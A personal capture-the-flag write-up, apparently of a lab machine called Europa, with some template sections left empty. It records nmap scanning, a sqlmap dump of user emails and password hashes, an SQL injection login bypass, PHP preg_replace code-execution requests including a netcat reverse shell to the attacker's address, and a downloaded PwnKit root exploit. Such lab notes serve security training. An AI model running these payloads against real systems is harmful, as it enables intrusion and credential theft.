

## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access:
- Privilege escalation:

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.175.57 -p22,80,443 -sC -sV -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-27 20:56 -0700
Nmap scan report for 10.129.175.57
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
| tls-alpn:
|_  http/1.1
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```
## Foothold

#### Steps

![[Pasted image 20260528120750.png]]


![[Pasted image 20260528120915.png]]
```
$ sqlmap -u "https://admin-portal.europacorp.htb/login.php" --data="email=test%40test.com&password=123" --level 5 --risk 3 --batch -D admin --tables -T users --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.10.4#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:37:41 /2026-05-27/

[21:37:41] [INFO] resuming back-end DBMS 'mysql'
[21:37:41] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=kcq1k0arv7r...ie6hgl1981'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: email=test@test.com' AND 6642=(SELECT (CASE WHEN (6642=6642) THEN 6642 ELSE (SELECT 9320 UNION SELECT 3062) END))-- -&password=123

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: email=test@test.com' AND EXTRACTVALUE(4719,CONCAT(0x5c,0x71706b7171,(SELECT (ELT(4719=4719,1))),0x716a786a71))-- uhWJ&password=123

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 9006 FROM (SELECT(SLEEP(5)))SVHs)-- YbFm&password=123
---
[21:37:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18, PHP
back-end DBMS: MySQL >= 5.1
[21:37:42] [INFO] fetching tables for database: 'admin'
[21:37:42] [INFO] resumed: 'users'
Database: admin
[1 table]
+-------+
| users |
+-------+

[21:37:42] [INFO] fetching columns for table 'users' in database 'admin'
[21:37:43] [WARNING] reflective value(s) found and filtering out
[21:37:44] [INFO] retrieved: 'id'
[21:37:45] [INFO] retrieved: 'int(11)'
[21:37:46] [INFO] retrieved: 'username'
[21:37:47] [INFO] retrieved: 'varchar(255)'
[21:37:48] [INFO] retrieved: 'email'
[21:37:49] [INFO] retrieved: 'varchar(255)'
[21:37:50] [INFO] retrieved: 'password'
[21:37:51] [INFO] retrieved: 'varchar(255)'
[21:37:52] [INFO] retrieved: 'active'
[21:37:53] [INFO] retrieved: 'tinyint(1)'
[21:37:53] [INFO] fetching entries for table 'users' in database 'admin'
[21:37:55] [INFO] retrieved: '1'
[21:37:56] [INFO] retrieved: 'admin@europacorp.htb'
[21:37:57] [INFO] retrieved: '1'
[21:37:59] [INFO] retrieved: '2b6d315337f18617ba18922c0b9597ff'
[21:38:00] [INFO] retrieved: 'administrator'
[21:38:01] [INFO] retrieved: '1'
[21:38:02] [INFO] retrieved: 'john@europacorp.htb'
[21:38:03] [INFO] retrieved: '2'
[21:38:05] [INFO] retrieved: '2b6d315337f18617ba18922c0b9597ff'
[21:38:06] [INFO] retrieved: 'john'
[21:38:06] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[21:38:06] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[21:38:06] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[21:38:06] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[21:38:06] [INFO] starting 6 processes
[21:38:11] [WARNING] no clear password(s) found
Database: admin
Table: users
[2 entries]
+----+----------------------+----------+----------------------------------+---------------+
| id | email                | active   | password                         | username      |
+----+----------------------+----------+----------------------------------+---------------+
| 1  | admin@europacorp.htb | 1        | 2b6d315337f18617ba18922c0b9597ff | administrator |
| 2  | john@europacorp.htb  | 1        | 2b6d315337f18617ba18922c0b9597ff | john          |
+----+----------------------+----------+----------------------------------+---------------+

[21:38:11] [INFO] table '`admin`.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb/dump/admin/users.csv'
[21:38:11] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/admin-portal.europacorp.htb'

[*] ending @ 21:38:11 /2026-05-27/
```

```
admin@europacorp.htb ';-- -
```

```
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=0sql38fvcutrftv5nk5pttk375
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://admin-portal.europacorp.htb/tools.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 1690
Origin: https://admin-portal.europacorp.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive



pattern=%2Fip_address%2F&ipaddress=system("id")&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A+++++++++++++
```

```
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=0sql38fvcutrftv5nk5pttk375
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://admin-portal.europacorp.htb/tools.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 164
Origin: https://admin-portal.europacorp.htb
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

Connection: keep-alive
pattern=%2Fx%2Fe&ipaddress=system("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.109%204444%20%3E%2Ftmp%2Ff")&text=x
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps

```
www-data@europa:/tmp$ wget http://10.10.14.109:8000/PwnKit
wget http://10.10.14.109:8000/PwnKit
--2026-05-28 10:05:17--  http://10.10.14.109:8000/PwnKit
Connecting to 10.10.14.109:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  17.62K  74.0KB/s    in 0.2s

2026-05-28 10:05:17 (74.0 KB/s) - 'PwnKit' saved [18040/18040]

www-data@europa:/tmp$ chmod +x ./PwnKit
chmod +x ./PwnKit
```

```
www-data@europa:/tmp$ ./PwnKit
./PwnKit
root@europa:/tmp#
```
## Lessons Learned
- Attack family: 
- Key takeaway:
	- Learn how to exploit `preg_replace` PHP function to obtain a RCE

## Resources
- References:


